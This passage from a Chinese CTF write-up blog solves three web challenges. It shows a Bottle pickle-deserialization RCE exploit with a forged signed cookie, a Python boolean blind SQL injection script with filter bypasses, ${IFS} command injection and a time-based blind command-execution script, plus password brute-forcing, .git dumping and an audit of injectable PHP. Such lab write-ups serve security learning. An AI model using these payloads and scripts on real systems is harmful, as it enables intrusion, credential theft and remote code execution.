class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">Hell0_H@</span><span class="hljs-symbol">cker_Y0u_A3r_Sm@</span>r7<br></code></pre></td></tr></table></figure><h3 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h3><p>可以看到有一个secret路由</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def secret_page():<br>    <span class="hljs-keyword">try</span>:<br>        session = request.get_cookie(<span class="hljs-string">&quot;name&quot;</span>, secret=secret)<br>        <span class="hljs-keyword">if</span> not session or session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;guest&quot;</span>:<br>            session = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>&#125;<br>            response.set_cookie(<span class="hljs-string">&quot;name&quot;</span>, session, secret=secret)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden!&#x27;</span><br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;The secret has been deleted!&#x27;</span><br>    except:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error!&quot;</span><br><br></code></pre></td></tr></table></figure><p>get_cookie的逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cookie</span>(<span class="hljs-params">self, key, default=<span class="hljs-literal">None</span>, secret=<span class="hljs-literal">None</span>, digestmod=hashlib.sha256</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the</span><br><span class="hljs-string">        `secret` must match the one used to create the cookie (see</span><br><span class="hljs-string">        :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing</span><br><span class="hljs-string">        cookie or wrong signature), return a default value. &quot;&quot;&quot;</span><br>    value = <span class="hljs-variable language_">self</span>.cookies.get(key)<br>    <span class="hljs-keyword">if</span> secret:<br>        <span class="hljs-comment"># See BaseResponse.set_cookie for details on signed cookies.</span><br>        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">and</span> value.startswith(<span class="hljs-string">&#x27;!&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">in</span> value:<br>            sig, msg = <span class="hljs-built_in">map</span>(tob, value[<span class="hljs-number">1</span>:].split(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-number">1</span>))<br>            <span class="hljs-built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()<br>            <span class="hljs-keyword">if</span> _lscmp(sig, base64.b64encode(<span class="hljs-built_in">hash</span>)):<br>                dst = pickle.loads(base64.b64decode(msg))<br>                <span class="hljs-keyword">if</span> dst <span class="hljs-keyword">and</span> dst[<span class="hljs-number">0</span>] == key:<br>                    <span class="hljs-keyword">return</span> dst[<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">return</span> default<br>    <span class="hljs-keyword">return</span> value <span class="hljs-keyword">or</span> default<br></code></pre></td></tr></table></figure><p>可以看到只要签名对得上就能直接进入pickle的反序列化</p><p>使用bottle的<code>cookie_encode</code>生成payload之后拿着payload去改session的值，并将请求发送到&#x2F;secret。随后可以把回显外带</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os  <br><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> cookie_encode  <br><span class="hljs-keyword">import</span> warnings  <br><br><span class="hljs-comment"># 忽略特定警告  </span><br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>, category=DeprecationWarning)  <br><br><span class="hljs-comment"># 自定义 secret  </span><br>secret = <span class="hljs-string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span>  <br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):  <br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;cp /f* ./2.txt&#x27;)&quot;&quot;&quot;</span>,))  <br><br><span class="hljs-comment"># 使用 cookie_encode 编码  </span><br>exp = cookie_encode(  <br>    (<span class="hljs-string">&#x27;session&#x27;</span>, &#123;<span class="hljs-string">&quot;name&quot;</span>: [Test()]&#125;),  <br>    secret  <br>)  <br><br><span class="hljs-comment"># 发起 GET 请求并传递 cookie  </span><br>response = requests.get(<span class="hljs-string">&#x27;http://gz.imxbt.cn:20785/secret&#x27;</span>, cookies=&#123;<span class="hljs-string">&#x27;name&#x27;</span>: exp.decode()&#125;)<br></code></pre></td></tr></table></figure><p>访问2.txt直接拿到flag。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h2 id="pickle反序列化-1"><a href="#pickle反序列化-1" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h2><p><a href="https://blog.csdn.net/qq_45392044/article/details/145811276?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-145811276-blog-44627959.235%5Ev43%5Econtrol&spm=1001.2101.3001.4242.1&utm_relevant_index=2">pickle反序列化原理</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 路径穿越 </tag>
            
            <tag> bottle </tag>
            
            <tag> pickle反序列化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2025-ezsql(手动滑稽)</title>
      <link href="/2025/04/08/XYCTF2025-ezsql-%E6%89%8B%E5%8A%A8%E6%BB%91%E7%A8%BD/"/>
      <url>/2025/04/08/XYCTF2025-ezsql-%E6%89%8B%E5%8A%A8%E6%BB%91%E7%A8%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="XYCTF2025-ezsql-手动滑稽"><a href="#XYCTF2025-ezsql-手动滑稽" class="headerlink" title="XYCTF2025-ezsql(手动滑稽)"></a>XYCTF2025-ezsql(手动滑稽)</h1><p>打开就是一个登录界面</p><p><img src="/../image/XYCTF2025-ezsql(%E6%89%8B%E5%8A%A8%E6%BB%91%E7%A8%BD)-1.png"></p><p>尝试了一下注入发现username传参可以注入，password我们输入都会被转义前面会被添加反引号，而且这里username存在空格过滤，我们可以使用tab即%09来绕过空格过滤</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=&#x27;%<span class="hljs-number">09</span>or%<span class="hljs-number">091</span>=<span class="hljs-number">1</span>%<span class="hljs-number">09</span>#&amp;password=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>发现跳转到了doublecheck.php，试了一下也没有注入，还要我们输入密钥，我们可以在login.php界面进行布尔盲注，注意到逗号也被过滤了，</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">使用substr(xxx <span class="hljs-selector-tag">from</span> <span class="hljs-attribute">x</span> for <span class="hljs-attribute">y</span>)代替substr(xxx,<span class="hljs-attribute">x</span>,<span class="hljs-attribute">y</span>)<br></code></pre></td></tr></table></figure><p>python脚本</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> r<br><br><br>url = <span class="hljs-string">&#x27;http://eci-2ze3h973qy7uqodho0gc.cloudeci1.ichunqiu.com/login.php&#x27;</span><br><br>value = <span class="hljs-string">&#x27;&#x27;</span><br>i = <span class="hljs-number">1</span><br><br>while <span class="hljs-literal">True</span>:<br>    low, high = <span class="hljs-number">0</span>, <span class="hljs-number">127</span><br>    char_ascii = <span class="hljs-number">0</span><br>    <br>    while low &lt;= high:<br>        mid = (low + high) <span class="hljs-comment">// 2</span><br><br>        # payload = f<span class="hljs-string">&quot;&#x27; OR ascii(substr(database() from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span>   # testdb<br>        # payload = f<span class="hljs-string">&quot;&#x27; OR ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;testdb&#x27;) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span> # double_check,user<br>        # payload = f<span class="hljs-string">&quot;&#x27; OR ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;double_check&#x27;) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span> # secret<br>        # payload = f<span class="hljs-string">&quot;&#x27; OR ascii(substr((select group_concat(secret) from double_check) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span> # dtfrtkcc0czkoua9S<br>        # payload = f<span class="hljs-string">&quot;&#x27; OR ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span> # username,password<br>        # payload = f<span class="hljs-string">&quot;&#x27; OR ascii(substr((select group_concat(username) from user) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span> # yudeyoushang<br>        payload = f<span class="hljs-string">&quot;&#x27; OR ascii(substr((select group_concat(password) from user) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span> # zhonghengyisheng<br><br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: payload.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;\t&quot;</span>),<br>            <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span><br>        &#125;<br><br>        result = r.post(url, data=data, allow_redirects=<span class="hljs-literal">False</span>)<br><br>        oracle = not <span class="hljs-string">&quot;帐号或密码错误&quot;</span> <span class="hljs-keyword">in</span> result.text<br>        <br>        <span class="hljs-keyword">if</span> oracle:<br>            low = mid + <span class="hljs-number">1</span><br>        else:<br>            high = mid - <span class="hljs-number">1</span><br>    <br>    <span class="hljs-keyword">if</span> high &lt; <span class="hljs-number">0</span>:<br>        break<br>    <br>    char_ascii = high + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> char_ascii == <span class="hljs-number">0</span>:<br>        break<br>    <br>    value += chr(char_ascii)<br>    print(f<span class="hljs-string">&quot;Current: &#123;value&#125;&quot;</span>)<br>    i += <span class="hljs-number">1</span><br><br>print(f<span class="hljs-string">&quot;Final value: &#123;value&#125;&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>把东西全都注出来，然后用拿到的账号密码还有secret登录</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">username</span> <span class="hljs-operator">=</span> yudeyoushang<br><span class="hljs-attribute">password</span> <span class="hljs-operator">=</span> zhonghengyisheng<br><span class="hljs-attribute">secret</span> <span class="hljs-operator">=</span> dtfrtkcc0czkoua9S<br></code></pre></td></tr></table></figure><hr><p>登录成功发现是一个命令执行的页面，无回显。</p><p><img src="/../image/XYCTF2025-ezsql(%E6%89%8B%E5%8A%A8%E6%BB%91%E7%A8%BD)-2.png"></p><p>测试了一下发现存在空格过滤，可以用${IFS}代替空格绕过，试一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sleep</span><span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>发现响应速度变慢了，说明可以执行命令。</p><p>将ls &#x2F;执行后的输出结果写入到flag.txt中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><span class="hljs-variable">$&#123;IFS&#125;</span>/<span class="hljs-variable">$&#123;IFS&#125;</span>&gt;<span class="hljs-variable">$&#123;IFS&#125;</span>flag.txt<br></code></pre></td></tr></table></figure><p>访问就能看到flag.txt了</p><p>然后直接将其写入到flag.txt中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span><span class="hljs-variable">$&#123;IFS&#125;</span>/flag.txt<span class="hljs-variable">$&#123;IFS&#125;</span>flag.txt<br></code></pre></td></tr></table></figure><p>再次访问flag.txt，就拿到flag了</p><hr><p>或者使用命令执行盲注脚本爆出flag</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> <span class="hljs-type">time</span><br><br># <span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> <span class="hljs-keyword">quote</span> <span class="hljs-keyword">as</span> urlen<br>headers = &#123;&quot;Cookie&quot;: &quot;PHPSESSID=a6994f9023a9a18160be0b7741d991ad&quot;&#125;  # 需要根据具体值修改<br><span class="hljs-type">char</span> = &quot;1234567890_.qwertyuiopasdfghjklzxcvbnmQAZWSXEDCRFVTGBYHNUJMIK&#123;&#125;OLP&quot;<br>flag = &quot;&quot;<br>url = <span class="hljs-string">&#x27;http://gz.imxbt.cn:20473/index.php&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>    flag += <span class="hljs-string">&#x27;---&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-type">char</span>:<br>            payload = &quot;if        [        `cat        /fla*        |        awk        &#x27;NR==&#123;&#125;&#x27;        |        cut        -c&#123;&#125;`        =        &#123;&#125;        ];then        sleep        0.5;fi&quot;.format(x, i, j)  # 延迟根据实际⽹络情况修改<br>            data = &#123;&quot;command&quot;: payload&#125;<br>            start_time = <span class="hljs-type">time</span>.time()<br>            response = requests.post(url=url, headers=headers, data=data)<br>            end_time = <span class="hljs-type">time</span>.time()<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt; <span class="hljs-number">0.5</span>:<br>                flag += j<br>                print(flag)<br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 布尔盲注 </tag>
            
            <tag> 逗号过滤 </tag>
            
            <tag> +%09绕过空格过滤 </tag>
            
            <tag> 无回显命令执行 </tag>
            
            <tag> 命令执行时间盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2018-Comment</title>
      <link href="/2025/04/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment/"/>
      <url>/2025/04/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯2018-Comment"><a href="#网鼎杯2018-Comment" class="headerlink" title="网鼎杯2018-Comment"></a>网鼎杯2018-Comment</h1><p>首先打开页面</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-1.png"></p><p>点击发帖，随便发点内容，然后自动给我们跳转到一个登录页面。</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-2.png"></p><p>给了我们账号和密码，但是密码的后三位没有告诉我们，我们可以使用burpsuite来爆破出密码，从1爆破到1000</p><p>最后</p><p>成功爆破出密码末尾三位为666，登录</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">zhangwei</span><br>zhangwei666<br></code></pre></td></tr></table></figure><hr><h2 id="githacker下载"><a href="#githacker下载" class="headerlink" title="githacker下载"></a>githacker下载</h2><p>登录之后又给我们跳转到了留言板，然后就没有其他信息了，这时候我们尝试使用githacker拿取git文件，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">githacker</span> --url http://<span class="hljs-number">2</span>f62bda5-c550-<span class="hljs-number">4886</span>-<span class="hljs-number">88</span>c5-d7d119a8c5e4.node5.buuoj.cn:<span class="hljs-number">81</span>/.git --output-folder result<br></code></pre></td></tr></table></figure><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-3.png"></p><p>成功将write_do.php文件下载下来</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-4.png"></p><p>write_do.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>但是很明显源码并不完整</p><h2 id="复原git文件"><a href="#复原git文件" class="headerlink" title="复原git文件"></a>复原git文件</h2><p><strong>在cmd界面进入到write_do.php的路径来</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">git <span class="hljs-built_in">log</span> <span class="hljs-comment">--all</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-5.png"></p><p><strong>可以看到，head指针指向的是最早一次commit，通过<code>git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</code> 命令将head指向第一个commit，得到完整的write_do.php</strong></p><p>这下代码就完整了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>代码审计</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 